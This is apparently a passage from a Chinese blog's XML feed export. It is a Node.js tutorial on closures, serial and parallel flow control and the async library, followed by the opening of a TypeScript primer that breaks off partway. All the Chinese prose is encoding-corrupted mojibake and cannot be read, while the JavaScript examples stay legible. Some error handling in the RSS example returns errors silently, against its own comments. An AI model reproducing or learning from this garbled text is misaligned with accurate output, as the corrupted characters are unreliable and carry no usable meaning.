å¼‚æ­¥å¼€å‘çš„éš¾é¢˜åœ¨åˆ›å»ºå¼‚æ­¥ç¨‹åºçš„æ—¶å€™ï¼Œå¿…é¡»å¯†åˆ‡å…³æ³¨ç¨‹åºçš„æ‰§è¡Œæµç¨‹ï¼Œç›¯ç€ç¨‹åºçš„çŠ¶æ€ï¼šäº‹ä»¶è½®è¯¢çš„æ¡ä»¶ã€ç¨‹åºå˜é‡ï¼Œä»¥åŠå…¶ä»–éšç€ç¨‹åºé€»è¾‘æ‰§è¡Œè€Œå‘ç”Ÿå˜åŒ–çš„èµ„æºã€‚ æ¯”å¦‚è¯´ï¼ŒNode çš„äº‹ä»¶è½®è¯¢ä¼šè·Ÿè¸ªè¿˜æ²¡æœ‰å®Œæˆçš„å¼‚æ­¥é€»è¾‘ã€‚åªè¦æœ‰å¼‚æ­¥é€»è¾‘æœªå®Œæˆï¼ŒNode è¿›ç¨‹å°±ä¸ä¼šé€€å‡ºã€‚ä¸€ä¸ªæŒç»­è¿è¡Œçš„ Node è¿›ç¨‹å¯¹ Web æœåŠ¡å™¨ä¹‹ç±»çš„åº”ç”¨æ¥è¯´å¾ˆæœ‰å¿…è¦ï¼Œä½†å¯¹äºŽå‘½ä»¤è¡Œå·¥å…·è¿™ç§ç»è¿‡ä¸€æ®µæ—¶é—´åŽå°±åº”è¯¥ç»“æŸçš„åº”ç”¨å´æ„ä¹‰ä¸å¤§ã€‚äº‹ä»¶è½®è¯¢ä¼šè·Ÿè¸ªæ‰€æœ‰æ•°æ®åº“è¿žæŽ¥ï¼Œç›´åˆ°å®ƒä»¬å…³é—­ï¼Œä»¥é˜²æ­¢ Node é€€å‡ºã€‚ ä¸‹é¢æ˜¯ä¸€æ®µå¯èƒ½å› ä¸ºæ‰§è¡Œé¡ºåºè€Œå¯¼è‡´æ··ä¹±çš„å¼‚æ­¥ä»£ç ï¼Œå¦‚æžœä¾‹å­ä¸­çš„ä»£ç èƒ½å¤ŸåŒæ­¥æ‰§è¡Œï¼Œé‚£ä¹ˆåº”è¯¥è¾“å‡ºçš„æ˜¯ â€˜The color is blueâ€™ï¼Œå¯è¿™ä¸ªä¾‹å­æ˜¯å¼‚æ­¥çš„ï¼Œåœ¨ console.log æ‰§è¡Œä¹‹å‰çš„ color çš„å€¼è¿˜åœ¨å˜åŒ–ï¼Œæ‰€ä»¥è¾“å‡ºçš„æ˜¯ â€˜The color is greenâ€™. 12345678910// ä½œç”¨åŸŸå¦‚ä½•åˆ°å¯¼è‡´ bug å‡ºçŽ°çš„function asyncFunction(callback)&#123; setTimeout(callback,200);&#125;let color = 'blue';asyncFunction(() =&gt;&#123; // æœ€æ™šæ‰§è¡Œï¼Œ200æ¯«ç§’åŽæ‰§è¡Œ console.log(`The color is $&#123;color&#125;`);&#125;);color = 'green'; ç”¨ JavaScript é—­åŒ…å¯ä»¥ â€˜å†»ç»“â€™color é‡Œé¢çš„å€¼ï¼Œåœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œå¯¹ asyncFunction çš„è°ƒç”¨è¢«å°è£…åˆ°äº†ä¸€ä¸ª ä»¥ color ä¸ºå‚æ•°çš„åŒ¿åå‡½æ•°é‡Œã€‚è¿™æ ·å°±å¯ä»¥é©¬ä¸Šæ‰§è¡Œè¿™ä¸ªåŒ¿åå‡½æ•°ï¼ŒæŠŠå½“å‰çš„ color çš„å€¼ä¼ ç»™å®ƒã€‚è€Œ color å˜æˆäº†åŒ¿åå‡½æ•°çš„é‡‡çº³æ•°ï¼Œä¹Ÿå°±æ˜¯è¿™ä¸ªåŒ¿åå‡½æ•°å†…éƒ¨çš„æœ¬åœ°å˜é‡ï¼Œå½“åŒ¿åå‡½æ•°å¤–é¢çš„ color å€¼å‘ç”Ÿå˜åŒ–çš„æ—¶å€™ï¼Œæœ¬åœ°çš„ color ä¸ä¼šå—åˆ°å½±å“ 123456789101112// ç”¨åŒ¿åå‡½æ•°ä¿ç•™å…¨å±€å˜é‡çš„å€¼function asyncFunction(callback)&#123; setTimeout(callback,200);&#125;let color = 'blue';(color =&gt; &#123; asyncFunction(() =&gt; &#123; console.log('The color is',color); &#125;);&#125;)(color);color = 'green'; é—­åŒ…æ˜¯ Node å¼€å‘ä¸­è¦ç»å¸¸ç”¨åˆ°çš„ä¸€ä¸ªç¼–ç¨‹æŠ€å·§ï¼ŒæŽ¥ç€çœ‹çœ‹æ€Žä¹ˆè®©å¼‚æ­¥é€»è¾‘é¡ºåºæ‰§è¡Œï¼Œå¥½æŽŒæ¡ç¨‹åºçš„æµç¨‹ã€‚ å¼‚æ­¥é€»è¾‘çš„é¡ºåºåŒ–åœ¨å¼‚æ­¥ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹æ±‡ä¸­ï¼Œæœ‰äº›ä»»åŠ¡å¯èƒ½ä¼šéšæ—¶å‘ç”Ÿï¼Œè·Ÿç¨‹åºä¸­çš„å…¶ä»–éƒ¨åˆ†åœ¨åšä»€ä¹ˆæ²¡æœ‰å…³ç³»ï¼Œä»€ä¹ˆæ—¶å€™åšè¿™äº›ä»»åŠ¡éƒ½ä¸ä¼šå‡ºé—®é¢˜ã€‚ä½†æœ‰äº›ä»»åŠ¡åªèƒ½åœ¨æŸäº›ç‰¹å®šçš„ä»»åŠ¡ä¹‹å‰æˆ–ä¹‹åŽåšã€‚ è®©ä¸€ç»„å¼‚æ­¥ä»»åŠ¡é¡ºåºæ‰§è¡Œçš„æ¦‚å¿µä¹Ÿè¢« Node ç¤¾åŒºç§°ä¸ºæµç¨‹æŽ§åˆ¶ã€‚è¿™ç§æŽ§åˆ¶åˆ†æˆä¸¤ç±»ï¼šä¸²è¡Œå’Œå¹¶è¡Œï¼š éœ€è¦ä¸€ä¸ªæŽ¥ç€ä¸€ä¸ªæ‰§è¡Œçš„ä»»åŠ¡å«ä½œä¸²è¡Œä»»åŠ¡ã€‚åˆ›å»ºä¸€ä¸ªç›®å½•å¹¶å¾€é‡Œæ”¾ä¸€ä¸ªæ–‡ä»¶çš„ä»»åŠ¡å°±æ˜¯ä¸²è¡Œçš„ã€‚ä½ ä¸èƒ½åœ¨åˆ›å»ºç›®å½•å‰å¾€é‡Œæ”¾æ–‡ä»¶ã€‚ ä¸éœ€è¦ä¸€ä¸ªæŽ¥ç€ä¸€ä¸ªæ‰§è¡Œçš„ä»»åŠ¡å«ä½œå¹¶è¡Œä»»åŠ¡ã€‚è¿™äº›ä»»åŠ¡å½¼æ­¤ä¹‹é—´å¼€å§‹å’Œç»“æŸçš„æ—¶é—´å¹¶ä¸é‡è¦ï¼Œä½†åœ¨åŽç»­é€»è¾‘æ‰§è¡Œä¹‹å‰å®ƒä»¬åº”è¯¥å…¨éƒ¨æ‰§è¡Œå®Œã€‚ä¸‹è½½å‡ ä¸ªæ–‡ä»¶ç„¶åŽæŠŠå®ƒä»¬åŽ‹ç¼©åˆ°ä¸€ä¸ª zipå½’æ¡£æ–‡ä»¶ä¸­å°±æ˜¯å¹¶è¡Œä»»åŠ¡ã€‚è¿™äº›æ–‡ä»¶çš„ä¸‹è½½å¯ä»¥åŒæ—¶è¿›è¡Œï¼Œä½†åœ¨åˆ›å»ºå½’æ¡£æ–‡ä»¶ä¹‹å‰åº”è¯¥å…¨éƒ¨ä¸‹è½½å®Œã€‚ è·Ÿè¸ªä¸²è¡Œå’Œå¹¶è¡Œçš„æµç¨‹æŽ§åˆ¶è¦åšç¼–ç¨‹è®°è´¦çš„å·¥ä½œã€‚åœ¨å®žçŽ°ä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶æ—¶ï¼Œéœ€è¦è·Ÿè¸ªå½“å‰æ‰§è¡Œçš„ä»»åŠ¡ï¼Œæˆ–ç»´æŠ¤ä¸€ä¸ªå°šæœªæ‰§è¡Œä»»åŠ¡çš„é˜Ÿåˆ—ã€‚å®žçŽ°å¹¶è¡ŒåŒ–æµç¨‹æŽ§åˆ¶æ—¶éœ€è¦è·Ÿè¸ªæœ‰å¤šå°‘ä¸ªä»»åŠ¡è¦æ‰§è¡Œå®Œæˆäº†ã€‚ æœ‰ä¸€äº›å¯ä»¥å¸®åŠ©è®°è´¦çš„æµç¨‹æŽ§åˆ¶å·¥å…·ï¼Œå®ƒä»¬èƒ½å¤Ÿè®©ç»„ç»‡å¼‚æ­¥çš„ä¸²è¡Œæˆ–å¹¶è¡ŒåŒ–ä»»åŠ¡å˜å¾—å¾ˆå®¹æ˜“ã€‚å°½ç®¡ç¤¾å›¢åˆ›å»ºäº†è®¸å¤šåºåˆ—åŒ–å¼‚æ­¥é€»è¾‘çš„è¾…åŠ©å·¥å…·ã€‚ä½†äº²è‡ªåŠ¨æ‰‹æ˜¯å®žçŽ°æµç¨‹æŽ§åˆ¶å¯ä»¥è®©æˆ‘ä»¬çœ‹é€å…¶ä¸­çš„çŽ„æœºã€‚ ä½•æ—¶ä½¿ç”¨ä¸²è¡Œæµç¨‹æŽ§åˆ¶å¯ä»¥ä½¿ç”¨å›žè°ƒè®©å‡ ä¸ªå¼‚æ­¥ä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œä½†æ˜¯å¦‚æžœä»»åŠ¡å¾ˆå¤šï¼Œå°±å¿…é¡»ç»„ç»‡ä¸€ä¸‹ï¼Œå¦åˆ™è¿‡å¤šçš„å›žè°ƒåµŒå¥—ä¼šæŠŠä»£ç æžå¾—å¾ˆä¹±ã€‚ ä¸‹é¢çš„è¿™æ®µä»£ç å°±æ˜¯ç”¨å›žè°ƒè®©ä»»åŠ¡é¡ºåºæ‰§è¡Œçš„ã€‚è¿™é‡Œä¾‹å­ç”¨ setTimeout æ¨¡æ‹Ÿéœ€è¦èŠ±æ—¶é—´æ‰§è¡Œçš„ä»»åŠ¡ï¼šç¬¬ä¸€ä¸ªä»»åŠ¡ç”¨äº†1ç§’ï¼Œç¬¬äºŒä¸ª0.5ç§’ï¼Œæœ€åŽä¸€ä¸ªååˆ†ä¹‹ä¸€ç§’ã€‚setTimeout åªæ˜¯ä¸€ä¸ªäººå·¥æ¨¡æ‹Ÿï¼Œåœ¨çœŸæ­£çš„ä»£ç ä¸­å¯èƒ½æ˜¯è¯»å–æ–‡ä»¶ã€å‘èµ·HTTP è¯·æ±‚ã€‚ 123456789setTimeout(() =&gt;&#123; console.log('I execute first.'); setTimeout(() =&gt;&#123; console.log('I execute next.'); setTimeout(() =&gt;&#123; console.log('I execute last.'); &#125;,100); &#125;,500);&#125;,1000); æ­¤å¤–ï¼Œä¹Ÿå¯ä»¥ç”¨ Async è¿™æ ·çš„æµç¨‹æŽ§åˆ¶å·¥å…·æ‰§è¡Œè¿™äº›ä»»åŠ¡ã€‚Async ç”¨èµ·æ¥ç®€å•ç›´æŽ¥ï¼Œå¹¶ä¸”ä»£ç é‡å°ã€‚å®‰è£…Async 1npm i async ç®€åŒ–ä»£ç ï¼š 123456789101112131415161718192021const async = require('async');async.series([ callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute first.'); callback(); &#125;, 1000); &#125;, callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute next.'); callback(); &#125;, 500); &#125;, callback =&gt; &#123; setTimeout(() =&gt; &#123; console.log('I execute last.'); callback(); &#125;, 100); &#125;,]); å°½ç®¡è¿™ç§ç”¨æµç¨‹æŽ§åˆ¶å®žçŽ°çš„ä»£ç å¾ˆå¤šï¼Œä½†é€šå¸¸å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§æ›´å¼ºï¼Œä¸€èˆ¬ä¹Ÿä¸ä¼šä¸€ç›´ç”¨æµç¨‹æŽ§åˆ¶ï¼Œå½“ç¢°åˆ°æƒ³è¦èº²å¼€å›žè°ƒåµŒå¥—çš„æƒ…å†µæ˜¯ï¼Œå®ƒå°±ä¼šæ˜¯æ”¹å–„ä»£ç å¯è¯»æ€§çš„å¥½å·¥å…·äº†ã€‚ çœ‹è¿‡è¿™ä¸ªç”¨ç‰¹åˆ¶å·¥å…·å®žçŽ°ä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶çš„ä¾‹å­åŽï¼Œæˆ‘ä»¬çœ‹çœ‹æ€Žä¹ˆä»Žå¤´å®žçŽ°å®ƒã€‚ å®žçŽ°ä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶ä¸ºäº†ç”¨ä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶è®©å‡ ä¸ªå¼‚æ­¥ä»»åŠ¡æŒ‰é¡ºåºæ‰§è¡Œï¼Œéœ€è¦å…ˆæŠŠè¿™äº›ä»»åŠ¡æŒ‰é¢„æœŸçš„æ‰§è¡Œé¡ºåºæ”¾åˆ°ä¸€ä¸ªæ•°ç»„ä¸­ã€‚è¿™ä¸ªæ•°ç»„å°†èµ·åˆ°é˜Ÿåˆ—çš„ä½œç”¨ï¼šå®Œæˆä¸€ä¸ªä»»åŠ¡åŽæŒ‰é¡ºåºä»Žæ•°ç»„ä¸­å–å‡ºä¸‹ä¸€ä¸ªã€‚ æ•°ç»„ä¸­çš„æ¯ä¸ªä»»åŠ¡éƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œä»»åŠ¡å®Œæˆä¹‹åŽåº”è¯¥è°ƒç”¨ä¸€ä¸ªå¤„ç†å‡½æ•°ï¼Œå‘Šè¯‰å®ƒé”™è¯¯çŠ¶æ€å’Œç»“æžœã€‚åœ¨è¿™ä¸€å®žçŽ°ä¸­ï¼Œå¦‚æžœæœ‰é”™è¯¯ï¼Œå¤„ç†å™¨å‡½æ•°å°±ä¼šç»ˆæ­¢ï¼Œå¦åˆ™å°±ä»Žé˜Ÿåˆ—ä¸­å–å‡ºä¸‹ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œå®ƒã€‚ å®žçŽ°ä¸€ä¸ªå°ç¨‹åºï¼Œè®©å®ƒä»Žä¸€ä¸ªéšæœºé€‰æ‹©çš„ RSS é¢„è®¢æºä¸­èŽ·å–ä¸€ç¯‡æ–‡ç« çš„æ ‡é¢˜å’ŒURLï¼Œå¹¶æ˜¾ç¤ºå‡ºæ¥ï¼ŒRSSé¢„è®¢æºåˆ—è¡¨æ”¾åœ¨ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ã€‚è¿™ä¸ªç¨‹åºçš„è¾“å‡ºæ˜¯åƒä¸‹é¢è¿™æ ·çš„æ–‡æœ¬ï¼š 12Of Course ML Has Monads!http://lambda-the-ultimate.org/node/4306 éœ€è¦ä»Ž npm ä¸‹è½½ä¸¤ä¸ªè¾…åŠ©æ¨¡å—ã€‚ 12npm i --save request@2.60.0npm i --save htmlparser@1.7.7 request æ¨¡å—æ˜¯ä¸ªç»è¿‡ç®€åŒ–çš„ HTTP å®¢æˆ·ç«¯ï¼Œä½ å¯ä»¥ç”¨å®ƒèŽ·å– RSS æ•°æ®ã€‚ htmlparser æ¨¡å—èƒ½æŠŠåŽŸå§‹çš„ RSSæ•°æ®è½¬æ¢æˆ JavaScriptæ•°æ®ç»“æž„ã€‚ åˆ›å»ºä¸€ä¸ª index.js æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465const fs = require('fs');const request = require('request');const htmlparser = require('htmlparser');const configFilename = './rss_feeds.txt';// ç¡®ä¿åŒ…å«RSSè®¢é˜…æº URL åˆ—è¡¨çš„æ–‡ä»¶å­˜åœ¨function checkForRSSFile() &#123; fs.exists(configFilename, (exists) =&gt; &#123; // æœ‰é”™è¯¯å°±è¿”å›ž if(!exists) return next(new Error(`Missing RSS file: $&#123;configFilename&#125;`)); next(null,configFilename); &#125;);&#125;// è¯»å–å¹¶è§£æžåŒ…å«é¢„è®¢æº URL çš„æ–‡ä»¶function readRSSFile(configFilename)&#123; fs.readFile(configFilename,(err,feedList) =&gt;&#123; if(err) return next(err); // å°†é¢„è®¢æºURL åˆ—è¡¨è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œç„¶åŽåˆ†éš”æˆä¸€ä¸ªæ•°ç»„ feedList = feedList.toString().replace(/^\s+|\s+$/g,'').split('\n'); // ä»Žé¢„è®¢æºURL æ•°ç»„ä¸­éšæœºé€‰æ‹©ä¸€ä¸ªé¢„è®¢æº URL const random = Math.floor(Math.random()* feedList.length); next(null,feedList[random]); &#125;);&#125;// å‘é€‰å®šçš„è®¢é˜…æºå‘é€ HTTP è¯·æ±‚ä»¥èŽ·å–æ•°æ®function downloadRSSFeed(feedUrl)&#123; request(&#123;uri:feedUrl&#125;,(err,res,body) =&gt;&#123; if(err) return err; if(res.statusCode !== 200) return next(new Error('Abnormal response status code')); next(null,body); &#125;);&#125;// å°†é¢„è®¢æºæ•°æ®è§£æžåˆ°ä¸€ä¸ªæ¡ç›®æ•°ç»„ä¸­function parseRSSFeed(rss)&#123; const handler = new htmlparser.RssHandler(); const parser = new htmlparser.Parser(handler); parser.parseComplete(rss); if(!handler.dom.items.length) return next(new Error('No RSS items found')); // å¦‚æžœæœ‰æ•°æ®ï¼Œæ˜¾ç¤ºç¬¬ä¸€ä¸ªé¢„è®¢æºæ¡ç›®çš„æ ‡é¢˜å’Œ URL const item = handler.dom.items.shift(); console.log(item.title); console.log(item.link);&#125;// æŠŠæ‰€æœ‰è¦åšçš„ä»»åŠ¡æŒ‰æ‰§è¡Œé¡ºåºæ·»åŠ åˆ°ä¸€ä¸ªæ•°ç»„ä¸­const tasks = [ checkForRSSFile, readRSSFile, downloadRSSFeed, parseRSSFeed]// è´Ÿè´£æ‰§è¡Œä»»åŠ¡çš„ nextå‡½æ•°function next(err,result)&#123; // å¦‚æžœä»»åŠ¡å‡ºé”™ï¼Œåˆ™æŠ›å‡ºå¼‚å¸¸ if(err) return err; // ä»Žä»»åŠ¡æ•°ç»„ä¸­å–å‡ºä¸‹ä¸€ä¸ªä»»åŠ¡ const currentTask = tasks.shift(); if(currentTask)&#123; // æ‰§è¡Œå½“å‰ä»»åŠ¡ currentTask(result); &#125;&#125;;// å¼€å§‹ä¸²è¡ŒåŒ–æ‰§è¡Œä»»åŠ¡next(); åœ¨è¯•ç”¨è¿™ä¸ªç¨‹åºä¹‹å‰ï¼Œå…ˆåœ¨ç¨‹åºè„šæœ¬æ‰€åœ¨çš„ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª rss_feeds.txt æ–‡ä»¶ã€‚å¦‚æžœä½ è‡ªå·±æ²¡æœ‰é¢„è®¢æºï¼Œå¯ä»¥è¯•ä¸€ä¸‹ Node åšå®¢ï¼Œåœ°å€æ˜¯ http://blog.nodejs.org/feed/ã€‚æŠŠé¢„è®¢æº URL æ”¾åˆ°è¿™ä¸ªæ–‡æœ¬æ–‡ä»¶ä¸­ï¼Œæ¯è¡Œä¸€æ¡ã€‚æ–‡ä»¶åˆ›å»ºå¥½åŽï¼Œæ‰“å¼€å‘½ä»¤è¡Œçª—å£è¾“å…¥ä¸‹é¢çš„å‘½ä»¤è¿›å…¥ç¨‹åºæ‰€åœ¨ç›®å½•å¹¶æ‰§è¡Œè„šæœ¬ï¼š 1node index.js æŽ¥ç€åœ¨æŽ§åˆ¶å°å¯ä»¥çœ‹åˆ°è¿™æ ·çš„ç»“æžœï¼š å¦‚æœ¬ä¾‹ä¸­çš„å®žçŽ°æ‰€ç¤ºï¼Œä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶æœ¬è´¨ä¸Šæ˜¯åœ¨éœ€è¦æ—¶è®©å›žè°ƒè¿›åœºï¼Œè€Œä¸æ˜¯ç®€å•åœ°æŠŠå®ƒä»¬åµŒå¥—èµ·æ¥ã€‚ çŽ°åœ¨å·²ç»çŸ¥é“æ€Žä¹ˆä¸²è¡ŒåŒ–æµç¨‹æŽ§åˆ¶äº†ï¼ŒæŽ¥ä¸‹æ¥çœ‹çœ‹å¦‚ä½•è®©å¼‚æ­¥ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œã€‚ å®žçŽ°å¹¶è¡ŒåŒ–æµç¨‹æŽ§åˆ¶ä¸ºäº†è®©å¼‚æ­¥ä»»åŠ¡å¹¶è¡Œæ‰§è¡Œï¼Œä»ç„¶æ˜¯è¦æŠŠä»»åŠ¡æ”¾åˆ°æ•°ç»„ä¸­ï¼Œä½†ä»»åŠ¡çš„å­˜æ”¾é¡ºåºæ— å…³ç´§è¦ã€‚æ¯ä¸ªä»»åŠ¡éƒ½åº”è¯¥è°ƒç”¨å¤„ç†å™¨å‡½æ•°å¢žåŠ å·²å®Œæˆä»»åŠ¡çš„è®¡æ•°å€¼ï¼Œå½“æ‰€æœ‰ä»»åŠ¡éƒ½å®Œå…¨åŽï¼Œå¤„ç†å™¨å‡½æ•°åº”è¯¥æ‰§è¡ŒåŽç»­çš„é€»è¾‘ã€‚ ä¸‹é¢å®žçŽ°ä¸€ä¸ªç®€å•çš„ç¨‹åºä½œä¸ºå¹¶è¡ŒåŒ–æµç¨‹æŽ§åˆ¶çš„ä¾‹å­ï¼Œå®ƒä¼šè¯»å–å‡ ä¸ªæ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œå¹¶è¾“å‡ºå•è¯åœ¨æ•´ä¸ªæ–‡ä»¶ä¸­å‡ºçŽ°çš„æ¬¡æ•°ã€‚æˆ‘ä»¬ä¼šç”¨å¼‚æ­¥çš„ readFile å‡½æ•°è¯»å–æ–‡æœ¬æ–‡ä»¶çš„å†…å®¹ï¼Œæ‰€æœ‰å‡ ä¸ªæ–‡ä»¶çš„è¯»å–å¯ä»¥å¹¶è¡Œæ‰§è¡Œã€‚ è¿™ä¸ªç¨‹åºçš„è¾“å‡ºçœ‹èµ·æ¥åº”è¯¥åƒæ˜¯ä¸‹é¢è¿™æ ·ï¼ˆå°½ç®¡å®žé™…ä¸Šå¯èƒ½è¦é•¿å¾ˆå¤šï¼‰ 1234would:2wrench:3writeable:1you:24 æ–°å»ºä¸€ä¸ªè¦åˆ†æžçš„æ–‡æœ¬æ–‡ä»¶çš„æ–‡ä»¶å¤¹ï¼štext. å®žçŽ°å¹¶è¡ŒåŒ–æµç¨‹æŽ§åˆ¶çš„ä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546// word_count/word_count.jsconst fs = require('fs');const tasks = [];const wordCounts = &#123;&#125;;const filesDir = '../text';let completedTasks = 0;// å½“æ‰€æœ‰ä»»åŠ¡å…¨éƒ¨å®Œå…¨åŽï¼Œåˆ—å‡ºæ–‡ä»¶ä¸­ç”¨åˆ°çš„æ¯ä¸ªå•è¯ä»¥åŠç”¨äº†å¤šå°‘æ¬¡function checkIfComplete() &#123; completedTasks++; if (completedTasks === tasks.length) &#123; for (let index in wordCounts) &#123; console.log(`$&#123;index&#125;:$&#123;wordCounts[index]&#125;`); &#125; &#125;&#125;function addWordCount(word) &#123; wordCounts[word] = (wordCounts[word]) ? wordCounts[word] + 1 : 1;&#125;// å¯¹æ–‡æœ¬ä¸­å‡ºçŽ°çš„å•è¯è®¡æ•°function countWordsInText(text) &#123; const words = text.toString().toLowerCase().split(/\W+/).sort(); words.filter(word =&gt; word).forEach(word =&gt; addWordCount(word));&#125;// å¾—å‡º text ç›®å½•ä¸­çš„æ–‡ä»¶åˆ—è¡¨fs.readdir(filesDir, (err, files) =&gt; &#123; if (err) throw err; files.forEach(file =&gt; &#123; // å®šä¹‰æ¯ä¸ªå¤„ç†æ–‡ä»¶çš„ä»»åŠ¡ï¼Œæ¯ä¸ªä»»åŠ¡ä¸­éƒ½ä¼šè°ƒç”¨ä¸€ä¸ªå¼‚æ­¥è¯»å–æ–‡ä»¶çš„å‡½æ•°å¹¶å¯¹æ–‡ä»¶ä¸­ä½¿ç”¨çš„å•è¯è®¡æ•° const task = (file =&gt; &#123; return () =&gt; &#123; fs.readFile(file, (err, text) =&gt; &#123; if (err) throw err; countWordsInText(text); checkIfComplete(); &#125;); &#125; &#125;)(`$&#123;filesDir&#125;/$&#123;file&#125;`); // æŠŠæ‰€æœ‰ä»»åŠ¡éƒ½æ·»åŠ åˆ°å‡½æ•°è°ƒç”¨æ•°ç»„ä¸­ tasks.push(task); &#125;); // å¼€å§‹å¹¶è¡Œæ‰§è¡Œä»»åŠ¡ tasks.forEach(task =&gt; task())&#125;); æ‰§è¡Œï¼š 1node word_count.js å¯ä»¥çœ‹åˆ°å¤§æ¦‚è¿™æ ·çš„ç»“æžœ: çŽ°åœ¨ï¼Œæˆ‘ä»¬å·²ç»çŸ¥é“ä¸²è¡Œå’Œå¹¶è¡Œçš„æµç¨‹åŒ–æŽ§åˆ¶çš„åº•å±‚æœºåˆ¶äº†ï¼ŒæŽ¥ä¸‹æ¥å¯ä»¥ç”¨ç¤¾åŒºè´¡çŒ®çš„å·¥å…·åœ¨ç¨‹åºä¸­å®žçŽ°æµç¨‹æŽ§åˆ¶ï¼Œè€Œä¸å¿…è‡ªå·±å®žçŽ°ã€‚ åˆ©ç”¨ç¤¾åŒºé‡Œçš„å·¥å…·ç¤¾åŒºä¸­çš„å¾ˆå¤šé™„åŠ æ¨¡å—éƒ½æä¾›äº†æ–¹ä¾¿å¥½ç”¨çš„æµç¨‹æŽ§åˆ¶å·¥å…·ï¼Œæ¯”è¾ƒæµè¡Œçš„æ˜¯ Asyncã€Step å’Œ Seq ä¸‰ä¸ªã€‚ æ€»ç»“ Node æ¨¡å—å¯ä»¥è¢«ç»„ç»‡å¯é‡ç”¨çš„æ¨¡å— require å‡½æ•°æ˜¯ç”¨æ¥åŠ è½½æ¨¡å—çš„ module.exports å’Œ exports å¯¹è±¡æ˜¯ç”¨æ¥åˆ†äº«æ¨¡å—å†…çš„å‡½æ•°å’Œå˜é‡çš„ package.json æ–‡ä»¶æ˜¯ç”¨æ¥æŒ‡æ˜Žä¾èµ–é¡¹çš„ï¼Œè¿˜è¦æŒ‡æ˜Žå°†å“ªä¸ªæ–‡ä»¶ä½œä¸ºä¸»æ–‡ä»¶ å¼‚æ­¥é€»è¾‘å¯ä»¥ç”¨æ¥åµŒå¥—å›žè°ƒã€äº‹ä»¶å‘å°„å™¨å’Œæµç¨‹æŽ§åˆ¶å·¥å…·æ¥æŽ§åˆ¶ã€‚]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[TypeScript å…¥é—¨]]></title>
    <url>%2F2018-11-28-TypeScript.html</url>
    <content type="text"><![CDATA[ä¸€ç›´ä»¥æ¥ï¼Œéƒ½å¸Œæœ›å¯ä»¥æŽŒæ¡ä¸€é—¨å¼ºç±»åž‹è¯­è¨€ï¼Œå¤§å­¦å­¦çš„javaã€cè¯­è¨€éƒ½å› ä¸ºå½“æ—¶å…´è‡´ä¸æµ“æ…¢æ…¢éƒ½ä¸¢å¾—å·®ä¸å¤šäº†ã€‚TypeScript æ˜¯ JavaScript çš„ä¸€ä¸ªè¶…é›†ï¼Œç™½é¹­å¼•æ“Žä¸­çš„wing3 å¼€å‘ä¹Ÿæ˜¯ç”¨tsï¼Œæ‰€ä»¥å­¦ä¹ è¿™æœ¬å¼ºç±»åž‹è¯­è¨€ã€‚ç”±äºŽæ˜¯åˆšå…¥é—¨ï¼Œåœ¨ç™¾åº¦æœç´¢ä¸Šé¢çœ‹åˆ°æœ‰ä¸€ä¸ªé˜®ä¸€å³°è€å¸ˆç‚¹è¯„çš„ TypeScriptå…¥é—¨æ•™ç¨‹ ä¸Šé¢æ•™ç¨‹ä½œè€…æ˜¯ï¼šxcatliu æ ¹æ®è¿™ä¸ªæ•™ç¨‹æ¥å­¦ä¹  TypeScript å¹¶åšç›¸å…³è®°å½•ã€‚ ç®€ä»‹ä»€ä¹ˆæ˜¯TypeScriptå®˜ç½‘çš„å®šä¹‰ï¼š TypeScript is a typed superset of JavaScript that compiles to plain JavaScript. Any browser. Any host. Any OS. Open source. ç¿»è¯‘ï¼š TypeScript æ˜¯ JavaScript çš„ç±»åž‹çš„è¶…é›†ï¼Œå®ƒå¯ä»¥ç¼–è¯‘æˆçº¯ JavaScriptã€‚ç¼–è¯‘å‡ºæ¥çš„ JavaScript å¯ä»¥è¿è¡Œåœ¨ä»»ä½•æµè§ˆå™¨ä¸Šã€‚TypeScript ç¼–è¯‘å·¥å…·å¯ä»¥è¿è¡Œåœ¨ä»»ä½•æœåŠ¡å™¨å’Œä»»ä½•ç³»ç»Ÿä¸Šã€‚TypeScript æ˜¯å¼€æºçš„ã€‚ ä¸ºä»€ä¹ˆé€‰æ‹© TypeScriptTypeScript å¢žåŠ äº†ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ ç±»åž‹ç³»ç»Ÿå®žé™…ä¸Šæ˜¯æœ€å¥½çš„æ–‡æ¡£ï¼Œå¤§éƒ¨åˆ†çš„å‡½æ•°çœ‹çœ‹ç±»åž‹çš„å®šä¹‰å°±å¯ä»¥çŸ¥é“å¦‚ä½•ä½¿ç”¨äº† å¯ä»¥åœ¨ç¼–è¯‘é˜¶æ®µå°±å‘çŽ°å¤§éƒ¨åˆ†é”™è¯¯ï¼Œè¿™æ€»æ¯”åœ¨è¿è¡Œæ—¶å€™å‡ºé”™å¥½ å¢žå¼ºäº†ç¼–è¾‘å™¨å’Œ IDE çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬ä»£ç è¡¥å…¨ã€æŽ¥å£æç¤ºã€è·³è½¬åˆ°å®šä¹‰ã€é‡æž„ç­‰ TypeScript éžå¸¸åŒ…å®¹ TypeScript æ˜¯ JavaScript çš„è¶…é›†ï¼Œ.js æ–‡ä»¶å¯ä»¥ç›´æŽ¥é‡å‘½åä¸º .ts å³å¯ 